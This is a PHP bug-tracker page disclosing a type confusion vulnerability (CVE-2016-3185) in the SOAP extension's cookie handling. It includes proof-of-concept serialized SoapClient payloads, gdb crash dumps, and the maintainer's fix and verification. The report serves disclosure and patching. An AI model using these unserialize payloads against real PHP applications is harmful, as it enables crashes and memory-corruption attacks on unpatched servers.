<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='SOAP related Bug #71610 - RDF' href='rss/bug.php?id=71610'>
        <link rel='alternate' type='application/rss+xml' title='SOAP related Bug #71610 - RSS 2.0' href='rss/bug.php?id=71610&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #71610 :: Type Confusion Vulnerability - SOAP / make_http_soap_request()</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=71610">Sec Bug</a>&nbsp;#71610</th>
            <td id="summary" colspan="5">Type Confusion Vulnerability - SOAP / make_http_soap_request()</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-02-16 17:14 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-03-17 04:49 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=SOAP+related">SOAP related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.0.3</td>
            <th class="details">OS:</th>
            <td>Linux</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3185" target="_blank">2016-3185</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=71610&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=71610&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=71610&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1455642897">&nbsp;</a><strong>[2016-02-16 17:14 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
<pre class='note'>Description:
------------
Due to an insufficient validation of the cookies field when making SOAP http request throug.

<a href="https://github.com/php/php-src/blob/master/ext/soap/php_http.c#L835" rel="nofollow">https://github.com/php/php-src/blob/master/ext/soap/php_http.c#L835</a>

There is lack of validation of 2nd/3rd elements in cookies array.

and a type confusion occurs when they are no longer string.

PoC works on the stack/heap layout.


* Notice:
- It causes crash on PHP5 package latest version for Ubuntu as well.
- It should work on 32/64 bit platform.


Test script:
---------------
&lt;?php

$exploit = 'O:10:&quot;SoapClient&quot;:1:{s:8:&quot;_cookies&quot;;a:1:{s:8:&quot;manhluat&quot;;a:3:{i:0;s:0:&quot;&quot;;i:1;N;i:2;N;}}}';
$z = unserialize($exploit);
$z-&gt;__doRequest('blahblah','<a href="http://localhost/','whatever',1337.0" rel="nofollow">http://localhost/','whatever',1337.0</a>);

?&gt;

Expected result:
----------------
root@ubuntu:/var/www/html/soap# /root/test/debug/php-7.0.3/sapi/cli/php -v
PHP 7.0.3 (cli) (built: Feb  7 2016 14:42:27) ( NTS )
Copyright (c) 1997-2016 The PHP Group
Zend Engine v3.0.0, Copyright (c) 1998-2016 Zend Technologies
root@ubuntu:/var/www/html/soap# /root/test/debug/php-7.0.3/sapi/cli/php ./2.php 
Segmentation fault (core dumped)
root@ubuntu:/var/www/html/soap# 


root@wargame:/tmp# php5 -v
PHP 5.5.9-1ubuntu4.14 (cli) (built: Oct 28 2015 01:34:46) 
Copyright (c) 1997-2014 The PHP Group
Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
root@wargame:/tmp# php5 ./a.php
Segmentation fault
root@wargame:/tmp# 

Actual result:
--------------
gdb-peda$ r
Starting program: /root/test/debug/php-7.0.3/sapi/cli/php ./2.php

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x801ae74b46ba941f 
RBX: 0x0 
RCX: 0x7ffff3c55254 --&gt; 0x0 
RDX: 0x20 (' ')
RSI: 0x1 
RDI: 0x7ffff3c55268 --&gt; 0xc002000700000001 
RBP: 0x7fffffffa7b0 --&gt; 0x7fffffffa840 --&gt; 0x7fffffffaad0 --&gt; 0x7fffffffab00 --&gt; 0x7fffffffac60 --&gt; 0x7fffffffad60 --&gt; 0x7fffffffcfe0 --&gt; 0x7fffffffe3d0 --&gt; 0x7fffffffe530 --&gt; 0x0 
RSP: 0x7fffffff8d30 --&gt; 0x7ffff3c130e0 --&gt; 0x0 
RIP: 0x74be3b (&lt;make_http_soap_request+36148&gt;:  mov    rdx,QWORD PTR [rax+0x10])
R8 : 0x7fffffff84c0 --&gt; 0x4 
R9 : 0x7fffffff87f8 --&gt; 0x0 
R10: 0x7fffffff84bc --&gt; 0x400007fff 
R11: 0x7ffff5bca870 --&gt; 0xfffda6c0fffda3ef 
R12: 0x436040 (&lt;_start&gt;:        xor    ebp,ebp)
R13: 0x7fffffffe610 --&gt; 0x2 
R14: 0x7ffff3c13030 --&gt; 0x7ffff3c84140 --&gt; 0x9e4bc0 (&lt;ZEND_DO_FCALL_SPEC_HANDLER&gt;:      push   rbp)
R15: 0x7ffff3c84140 --&gt; 0x9e4bc0 (&lt;ZEND_DO_FCALL_SPEC_HANDLER&gt;: push   rbp)
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x74be2f &lt;make_http_soap_request+36136&gt;:     je     0x74be84 &lt;make_http_soap_request+36221&gt;
   0x74be31 &lt;make_http_soap_request+36138&gt;:     mov    rax,QWORD PTR [rbp-0x1810]
   0x74be38 &lt;make_http_soap_request+36145&gt;:     mov    rax,QWORD PTR [rax]
=&gt; 0x74be3b &lt;make_http_soap_request+36148&gt;:     mov    rdx,QWORD PTR [rax+0x10]
   0x74be3f &lt;make_http_soap_request+36152&gt;:     mov    rax,QWORD PTR [rbp-0x1810]
   0x74be46 &lt;make_http_soap_request+36159&gt;:     mov    rax,QWORD PTR [rax]
   0x74be49 &lt;make_http_soap_request+36162&gt;:     lea    rcx,[rax+0x18]
   0x74be4d &lt;make_http_soap_request+36166&gt;:     mov    rax,QWORD PTR [rbp-0x1908]
[------------------------------------stack-------------------------------------]
0000| 0x7fffffff8d30 --&gt; 0x7ffff3c130e0 --&gt; 0x0 
0008| 0x7fffffff8d38 --&gt; 0x53900000000 
0016| 0x7fffffff8d40 --&gt; 0x7ffff3c604c8 (&quot;whatever&quot;)
0024| 0x7fffffff8d48 --&gt; 0x7ffff3c61138 (&quot;<a href="http://localhost/&quot;" rel="nofollow">http://localhost/&quot;</a>)
0032| 0x7fffffff8d50 --&gt; 0x7ffff3c60488 --&gt; 0x20600000000 
0040| 0x7fffffff8d58 --&gt; 0x7ffff3c13110 --&gt; 0x7ffff3c60438 --&gt; 0x800000002 
0048| 0x7fffffff8d60 --&gt; 0x10100000000 
0056| 0x7fffffff8d68 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x000000000074be3b in make_http_soap_request (this_ptr=0x7ffff3c13110, buf=0x7ffff3c60488, location=0x7ffff3c61138 &quot;<a href="http://localhost/&quot;" rel="nofollow">http://localhost/&quot;</a>, soapaction=0x7ffff3c604c8 &quot;whatever&quot;, soap_version=0x539, return_value=0x7ffff3c130e0)
    at /root/test/debug/php-7.0.3/ext/soap/php_http.c:836
836                                                            strncmp(phpurl-&gt;path?phpurl-&gt;path:&quot;/&quot;,Z_STRVAL_P(tmp),Z_STRLEN_P(tmp)) == 0) &amp;&amp;
gdb-peda$ print tmp
$14 = (zval *) 0x7ffff3c5b900
gdb-peda$ print *(zval*)tmp
$15 = {
  value = {
    lval = 0x801ae74b46ba941f, 
    dval = -3.7413910991275156e-308, 
    counted = 0x801ae74b46ba941f, 
    str = 0x801ae74b46ba941f, 
    arr = 0x801ae74b46ba941f, 
    obj = 0x801ae74b46ba941f, 
    res = 0x801ae74b46ba941f, 
    ref = 0x801ae74b46ba941f, 
    ast = 0x801ae74b46ba941f, 
    zv = 0x801ae74b46ba941f, 
    ptr = 0x801ae74b46ba941f, 
    ce = 0x801ae74b46ba941f, 
    func = 0x801ae74b46ba941f, 
    ww = {
      w1 = 0x46ba941f, 
      w2 = 0x801ae74b
    }
  }, 
  u1 = {
    v = {
      type = 0x1, 
      type_flags = 0x0, 
      const_flags = 0x0, 
      reserved = 0x0
    }, 
    type_info = 0x1
  }, 
  u2 = {
    var_flags = 0xffffffff, 
    next = 0xffffffff, 
    cache_slot = 0xffffffff, 
    lineno = 0xffffffff, 
    num_args = 0xffffffff, 
    fe_pos = 0xffffffff, 
    fe_iter_idx = 0xffffffff
  }
}
gdb-peda$ x/10gx tmp
0x7ffff3c5b900: 0x801ae74b46ba941f      0xffffffff00000001
0x7ffff3c5b910: 0x0000000000000001      0x0000000000000000
0x7ffff3c5b920: 0x801ae74b46ba941f      0xffffffff00000001
0x7ffff3c5b930: 0x0000000000000002      0x0000000000000000
0x7ffff3c5b940: 0x0000000000000000      0x0000000000000000
gdb-peda$ 






---------------------------------------------------






gdb-peda$ r -v
Starting program: /usr/bin/php5 -v
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
PHP 5.5.9-1ubuntu4.14 (cli) (built: Oct 28 2015 01:34:46) 
Copyright (c) 1997-2014 The PHP Group
Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
[Inferior 1 (process 68921) exited normally]
Warning: not running or target is remote
gdb-peda$ r ./2.php 
Starting program: /usr/bin/php5 ./2.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x7ffff7fc9ae8 --&gt; 0x7ffff7fca348 --&gt; 0x7f0070747468 
RBX: 0x0 
RCX: 0x7ffff7fc9930 --&gt; 0x2 
RDX: 0x7fffffff8a70 --&gt; 0x7ffff7fc9948 --&gt; 0x7ffff7fc9900 --&gt; 0x0 
RSI: 0x2 
RDI: 0x7ffff7fca6e8 --&gt; 0x700000008 
RBP: 0x7fffffff89b0 --&gt; 0x7ffff7fcb1b8 (&quot;POST / HTTP/1.1\r\nHost: localhost\r\nConnection: Keep-Alive\r\nUser-Agent: PHP-SOAP/5.5.9-1ubuntu4.14\r\nContent-Type: text/xml; charset=utf-8\r\nSOAPAction: \&quot;whatever\&quot;\r\nContent-Length: 8\r\nCookie: &quot;)
RSP: 0x7fffffff8890 --&gt; 0x0 
RIP: 0x5b520b (&lt;make_http_soap_request+17323&gt;:  cmp    BYTE PTR [r12],0x2e)
R8 : 0x0 
R9 : 0x0 
R10: 0x7fffffff8650 --&gt; 0x0 
R11: 0x7ffff6087460 (&lt;__strncmp_ssse3&gt;: test   rdx,rdx)
R12: 0x0 
R13: 0x7ffff7fc8990 --&gt; 0x1 
R14: 0x7fffffff8a10 --&gt; 0x7ffff7fca768 --&gt; 0x7ffff7fca6b8 --&gt; 0x7ffff7fca6e8 --&gt; 0x700000008 
R15: 0x7fffffff8a30 --&gt; 0x7ffff7fca798 (&quot;manhluat&quot;)
EFLAGS: 0x10213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5b5200 &lt;make_http_soap_request+17312&gt;:     mov    rax,QWORD PTR [rax]
   0x5b5203 &lt;make_http_soap_request+17315&gt;:     mov    r12,QWORD PTR [rax]
   0x5b5206 &lt;make_http_soap_request+17318&gt;:     mov    rax,QWORD PTR [rsp+0x20]
=&gt; 0x5b520b &lt;make_http_soap_request+17323&gt;:     cmp    BYTE PTR [r12],0x2e
   0x5b5210 &lt;make_http_soap_request+17328&gt;:     mov    rbx,QWORD PTR [rax+0x18]
   0x5b5214 &lt;make_http_soap_request+17332&gt;:     je     0x5b6629 &lt;make_http_soap_request+22473&gt;
   0x5b521a &lt;make_http_soap_request+17338&gt;:     mov    rsi,r12
   0x5b521d &lt;make_http_soap_request+17341&gt;:     mov    rdi,rbx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffff8890 --&gt; 0x0 
0008| 0x7fffffff8898 --&gt; 0x0 
0016| 0x7fffffff88a0 --&gt; 0x0 
0024| 0x7fffffff88a8 --&gt; 0x7fffffff89d2 --&gt; 0x116005500030001 
0032| 0x7fffffff88b0 --&gt; 0x7ffff7fc9ae8 --&gt; 0x7ffff7fca348 --&gt; 0x7f0070747468 
0040| 0x7fffffff88b8 --&gt; 0x7ffff7fc9c50 --&gt; 0xe95f80 --&gt; 0x4a5350 (&lt;php_openssl_sockop_write&gt;:  push   r14)
0048| 0x7fffffff88c0 --&gt; 0x8 
0056| 0x7fffffff88c8 --&gt; 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
make_http_soap_request (this_ptr=this_ptr@entry=0x7ffff7fc8990, buf=&lt;optimized out&gt;, buf_size=&lt;optimized out&gt;, location=&lt;optimized out&gt;, soapaction=&lt;optimized out&gt;, soap_version=&lt;optimized out&gt;, 
    buffer=buffer@entry=0x7ffff7fc9710, buffer_len=buffer_len@entry=0x7ffff7fc9718) at /build/php5-pO28mL/php5-5.5.9+dfsg/ext/soap/php_http.c:836
836     /build/php5-pO28mL/php5-5.5.9+dfsg/ext/soap/php_http.c: No such file or directory.
gdb-peda$ 

</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=71610'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=71610'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1455795371">&nbsp;</a><strong>[2016-02-18 11:36 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
<pre class='note'>BTW, PoC can be triggered via this one also

&lt;?php

$exploit = unserialize('O:10:&quot;SoapClient&quot;:3:{s:3:&quot;uri&quot;;s:1:&quot;a&quot;;s:8:&quot;location&quot;;s:17:&quot;<a href="http://localhost/&quot;;s:8:&quot;_cookies&quot;;a:1:{s:8:&quot;manhluat&quot;;a:3:{i:0;s:0:&quot;&quot;;i:1;N;i:2;N;}}}}'" rel="nofollow">http://localhost/&quot;;s:8:&quot;_cookies&quot;;a:1:{s:8:&quot;manhluat&quot;;a:3:{i:0;s:0:&quot;&quot;;i:1;N;i:2;N;}}}}'</a>);
$exploit-&gt;blahblah();

?&gt;

Segmentation fault
</pre>
</div><div class='comment type_log' ><a name="1456127292">&nbsp;</a><strong>[2016-02-22 07:48 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1456127292">&nbsp;</a><strong>[2016-02-22 07:48 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Fix added to security repo as eaf4e77190d402ea014207e9a7d5da1a4f3727ba and in  <a href="https://gist.github.com/smalyshev/cb5199ebf608afc4f667" rel="nofollow">https://gist.github.com/smalyshev/cb5199ebf608afc4f667</a>. Please verify.
</pre>
</div><div class='comment type_comment' ><a name="1456129339">&nbsp;</a><strong>[2016-02-22 08:22 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
<pre class='note'>well, seems the problem is solved.
</pre>
</div><div class='comment type_svn' ><a name="1456902760">&nbsp;</a><strong>[2016-03-02 07:12 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=07b6fc93b11b46926db6e7c02f90c84981a40c33" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=07b6fc93b11b46926db6e7c02f90c84981a40c33</a>
Log: Fix <a href='bug.php?id=71610'>bug #71610</a>: Type Confusion Vulnerability - SOAP / make_http_soap_request()
</pre>
</div><div class='comment type_log' ><a name="1456902761">&nbsp;</a><strong>[2016-03-02 07:12 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1456902764">&nbsp;</a><strong>[2016-03-02 07:12 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=eaf4e77190d402ea014207e9a7d5da1a4f3727ba" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=eaf4e77190d402ea014207e9a7d5da1a4f3727ba</a>
Log: Fix <a href='bug.php?id=71610'>bug #71610</a>: Type Confusion Vulnerability - SOAP / make_http_soap_request()
</pre>
</div><div class='comment type_log' ><a name="1458190172">&nbsp;</a><strong>[2016-03-17 04:49 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2016-3185</span>
</div></div></div><div class='comment type_svn' ><a name="1469014393">&nbsp;</a><strong>[2016-07-20 11:33 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=07b6fc93b11b46926db6e7c02f90c84981a40c33" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=07b6fc93b11b46926db6e7c02f90c84981a40c33</a>
Log: Fix <a href='bug.php?id=71610'>bug #71610</a>: Type Confusion Vulnerability - SOAP / make_http_soap_request()
</pre>
</div><div class='comment type_svn' ><a name="1469014399">&nbsp;</a><strong>[2016-07-20 11:33 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=eaf4e77190d402ea014207e9a7d5da1a4f3727ba" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=eaf4e77190d402ea014207e9a7d5da1a4f3727ba</a>
Log: Fix <a href='bug.php?id=71610'>bug #71610</a>: Type Confusion Vulnerability - SOAP / make_http_soap_request()
</pre>
</div><div class='comment type_comment' ><a name="1524735163">&nbsp;</a><strong>[2018-04-26 09:32 UTC] m &#x64;&#111;&#x74; r &#x64;&#111;&#x74; sopacua &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>The test needs fixing, since for me the error message is different, whereas anything that does not generate a segmentation fault, is considered a working fix.


---- EXPECTED OUTPUT
looks like we got no XML document
---- ACTUAL OUTPUT
Could not connect to host
---- FAILED

(Could not connect to host is by far the preferable error message, but YMMV).
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
